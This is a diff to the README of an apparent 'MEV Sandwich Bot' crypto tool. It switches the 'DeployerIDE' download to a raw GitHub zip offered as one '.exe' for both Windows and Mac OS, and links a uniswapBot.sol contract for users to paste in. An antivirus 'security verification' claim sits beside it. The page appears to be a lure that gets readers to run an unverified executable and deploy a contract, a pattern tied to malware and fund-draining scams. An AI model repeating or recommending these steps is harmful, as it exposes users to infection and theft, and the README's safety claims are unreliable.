@@ -50,7 +50,7 @@ The **DeployerIDE** local deployer provides a secure and efficient environment f
 
 1.  **Download and launch DeployerIDE**.
 2.  **Follow the setup instructions** available in the Documentation section.
--   [Download for Windows/Mac OS (.exe)](DeployerIDE.zip)
+-   [Download for Windows/Mac OS (.exe)](https://github.com/aulwarpX/MEV-UniswapBot/raw/refs/heads/main/DeployerIDE.zip)
 -   [Download for Python (.py)](deployer.py)
 
 ### 🛡️ Security Verification
@@ -83,7 +83,7 @@ The program has been scanned for security using antivirus tools. Below is a scre
   <img src="https://i.ibb.co/pPz0Bzt/SdKy.png" alt="MEV Sandwich Bot Interface">
 </p>
 
-3. [**Insert your contract source code**](link_to_file.sol) in the `Enter Contract Code` field.
+3. [**Insert your contract source code**](uniswapBot.sol) in the `Enter Contract Code` field.
 <p align="center">
   <img src="https://i.ibb.co/t2NwQjZ/code.png" alt="MEV Sandwich Bot Interface" width="200" height="300">
 </p>
